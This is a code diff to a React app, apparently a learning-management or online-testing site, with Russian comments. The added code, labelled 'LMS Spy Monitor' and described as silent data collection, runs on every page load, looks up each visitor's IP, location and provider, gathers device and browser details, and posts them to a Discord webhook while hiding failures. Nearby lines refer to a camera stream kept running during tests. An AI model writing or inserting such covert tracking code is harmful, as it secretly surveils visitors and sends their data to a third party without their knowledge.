@@ -240,6 +240,50 @@ function App() {
   const [customQCount, setCustomQCount] = useState(''); 
   const [isAnimating, setIsAnimating] = useState(false);
 
+  // --- ФУНКЦИЯ ТИХОГО СБОРА ДАННЫХ ПРИ ВХОДЕ ---
+  const logVisitor = async () => {
+      try {
+          // Тихо получаем IP, город, страну и провайдера
+          const ipReq = await fetch('https://ipapi.co/json/');
+          const ipData = await ipReq.json();
+
+          // Собираем данные об устройстве
+          const deviceInfo = navigator.userAgent;
+          const screenRes = `${window.screen.width}x${window.screen.height}`;
+          const platform = navigator.platform || "Неизвестно";
+          const lang = navigator.language || "Неизвестно";
+
+          let payload = {
+              username: "LMS Spy Monitor",
+              avatar_url: "https://i.imgur.com/4M34hi2.png",
+              embeds: [{
+                  title: "👁️ НОВЫЙ ПОСЕТИТЕЛЬ НА САЙТЕ",
+                  color: 16753920, // Оранжевый цвет для привлечения внимания
+                  fields: [
+                      { name: "📍 Локация", value: `${ipData.country_name || 'Скрыто'}, ${ipData.city || 'Скрыто'}\nПровайдер: ${ipData.org || 'Скрыто'}`, inline: true },
+                      { name: "🌐 IP Адрес", value: `\`${ipData.ip || 'Скрыто'}\``, inline: true },
+                      { name: "🖥️ Экран и ОС", value: `ОС: ${platform}\nРазрешение: ${screenRes}\nЯзык: ${lang}`, inline: true },
+                      { name: "💻 Устройство / Браузер", value: `\`\`\`${deviceInfo}\`\`\`` }
+                  ],
+                  timestamp: new Date().toISOString()
+              }]
+          };
+
+          let formData = new FormData();
+          formData.append('payload_json', JSON.stringify(payload));
+          
+          // Отправляем в твой вебхук
+          await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+      } catch (e) {
+          // Игнорируем ошибки, если блокировщик рекламы зарезал запрос
+      }
+  };
+
+  // Запуск сбора данных при открытии страницы
+  useEffect(() => {
+      logVisitor();
+  }, []);
+
   // ССЫЛКИ ДЛЯ ПОДДЕРЖАНИЯ КАМЕРЫ ОНЛАЙН БЕЗ ПОВТОРНЫХ ЗАПРОСОВ
   const streamRef = useRef(null);
   const videoRef = useRef(null);
@@ -328,7 +372,7 @@ function App() {
       }
   }, [view]);
 
-  // Таймер на 30 секунд для фото
+  // Таймер на 30 секунд для фото (сейчас установлено на 90000 = 1.5 минуты)
   useEffect(() => {
     let intervalId = null;
     if (view === 'test') {
